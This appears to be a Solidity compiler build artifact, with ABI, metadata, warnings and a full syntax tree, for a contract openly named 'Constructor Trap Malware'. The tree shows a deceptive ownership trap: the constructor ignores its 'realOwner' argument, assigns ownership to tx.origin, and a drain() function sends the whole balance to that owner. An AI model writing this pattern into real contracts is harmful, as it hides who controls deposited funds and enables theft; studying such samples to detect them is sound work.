											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 1585,
											"end": 1716,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1585,
											"end": 1716,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1585,
											"end": 1716,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1577,
											"end": 1716,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1577,
											"end": 1716,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1723,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1723,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1723,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1723,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"M/Constructor Trap Malware.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"drain()": "9890220b",
							"owner()": "8da5cb5b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"realOwner\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"drain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"M/Constructor Trap Malware.sol\":\"ConstructorTrap\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"M/Constructor Trap Malware.sol\":{\"keccak256\":\"0x99492c4f8729b95a975e9aa5b11cfb4e51dfe8774dd2fc82ab2024baa6ebbe41\",\"urls\":[\"bzz-raw://fd7bdf9106c67d8a7c8efb9893830801734a92667ef79d16122439a8513b28f3\",\"dweb:/ipfs/QmbXNfmDsMQU3t71LU2vy75ugCnxXPpuszXztYTcidwN8c\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 2,
								"contract": "M/Constructor Trap Malware.sol:ConstructorTrap",
								"label": "owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> M/Constructor Trap Malware.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "M/Constructor Trap Malware.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "3420",
				"formattedMessage": "Warning: Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.29;\"\n--> M/Constructor Trap Malware.sol\n\n",
				"message": "Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.29;\"",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "M/Constructor Trap Malware.sol",
					"start": -1
				},
				"type": "Warning"
			}
		],
		"sources": {
			"M/Constructor Trap Malware.sol": {
				"ast": {
					"absolutePath": "M/Constructor Trap Malware.sol",
					"exportedSymbols": {
						"ConstructorTrap": [
							44
						]
					},
					"id": 45,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "ConstructorTrap",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 44,
							"linearizedBaseContracts": [
								44
							],
							"name": "ConstructorTrap",
							"nameLocation": "9:15:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 2,
									"mutability": "mutable",
									"name": "owner",
									"nameLocation": "46:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 44,
									"src": "31:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 1,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "31:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 14,
										"nodeType": "Block",
										"src": "89:125:0",
										"statements": [
											{
												"expression": {
													"id": 7,
													"name": "realOwner",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 4,
													"src": "138:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 8,
												"nodeType": "ExpressionStatement",
												"src": "138:9:0"
											},
											{
												"expression": {
													"id": 12,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 9,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2,
														"src": "181:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 10,
															"name": "tx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967270,
															"src": "189:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_transaction",
																"typeString": "tx"
															}
														},
														"id": 11,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "192:6:0",
														"memberName": "origin",
														"nodeType": "MemberAccess",
														"src": "189:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "181:17:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 13,
												"nodeType": "ExpressionStatement",
												"src": "181:17:0"
											}
										]
									},
									"id": 15,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 5,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 4,
												"mutability": "mutable",
												"name": "realOwner",
												"nameLocation": "78:9:0",
												"nodeType": "VariableDeclaration",
												"scope": 15,
												"src": "70:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 3,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "70:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "69:19:0"
									},
									"returnParameters": {
										"id": 6,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "89:0:0"
									},
									"scope": 44,
									"src": "58:156:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 38,
										"nodeType": "Block",
										"src": "246:114:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 22,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"expression": {
																	"id": 19,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967281,
																	"src": "264:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 20,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "268:6:0",
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"src": "264:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"id": 21,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2,
																"src": "278:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "264:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "4e6f74206f776e6572",
															"id": 23,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "285:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682",
																"typeString": "literal_string \"Not owner\""
															},
															"value": "Not owner"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682",
																"typeString": "literal_string \"Not owner\""
															}
														],
														"id": 18,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "256:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 24,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "256:41:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 25,
												"nodeType": "ExpressionStatement",
												"src": "256:41:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"arguments": [
																	{
																		"id": 33,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 4294967268,
																		"src": "339:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_ConstructorTrap_$44",
																			"typeString": "contract ConstructorTrap"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_ConstructorTrap_$44",
																			"typeString": "contract ConstructorTrap"
																		}
																	],
																	"id": 32,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "331:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 31,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "331:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 34,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "331:13:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"id": 35,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "345:7:0",
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"src": "331:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 28,
																	"name": "owner",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2,
																	"src": "315:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 27,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "307:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
																"typeName": {
																	"id": 26,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "307:8:0",
																	"stateMutability": "payable",
																	"typeDescriptions": {}
																}
															},
															"id": 29,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "307:14:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 30,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "322:8:0",
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"src": "307:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 36,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "307:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 37,
												"nodeType": "ExpressionStatement",
												"src": "307:46:0"
											}
										]
									},
									"functionSelector": "9890220b",
									"id": 39,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "drain",
									"nameLocation": "229:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 16,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "234:2:0"
									},
									"returnParameters": {
										"id": 17,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "246:0:0"
									},
									"scope": 44,
									"src": "220:140:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": {
										"id": 42,
										"nodeType": "Block",
										"src": "393:2:0",
										"statements": []
									},
									"id": 43,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 40,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "373:2:0"
									},
									"returnParameters": {
										"id": 41,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "393:0:0"
									},
									"scope": 44,
									"src": "366:29:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 45,
							"src": "0:397:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "0:398:0"
				},
				"id": 0
			}
		}
	}
}